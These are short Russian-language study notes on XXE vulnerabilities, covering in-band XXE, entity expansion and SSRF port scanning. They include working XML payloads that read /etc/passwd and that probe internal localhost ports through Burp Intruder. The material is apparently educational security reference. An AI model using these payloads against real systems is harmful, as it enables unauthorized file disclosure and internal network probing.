[[XML eXternal Entity (XXE)]]

XXE in-band -  это уязвимость XXE, при которой злоумышленник может видеть ответ от сервера. Это позволяет легко осуществлять утечку данных и использовать уязвимость

Пример:
```
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

Расширение XML-сущностей — это метод, часто используемый в XXE-атаках, который заключается в определении сущностей внутри XML-документа, которые затем расширяются XML-парсером. Злоумышленники могут злоупотреблять этой функцией, создавая рекурсивные или чрезмерно большие сущности, что приводит к атаке типа «отказ в обслуживании» (DoS), или определяя внешние сущности, ссылающиеся на конфиденциальные файлы или службы. 
```
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "This is a test message" >]>
<contact><name>&xxe; &xxe;
</name><email>test@test.com</email><message>test</message></contact>
```

Рассмотрим сценарий, в котором уязвимый сервер размещает другое веб-приложение внутри сети на нестандартном порту. Злоумышленник может использовать уязвимость XXE, которая заставляет сервер отправлять запрос к собственному внутреннему сетевому ресурсу.

Например, используя перехваченный запрос из in-band  XXE, отправьте перехваченный запрос в Burp Intruder и используйте приведенную ниже полезную нагрузку:

```
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```
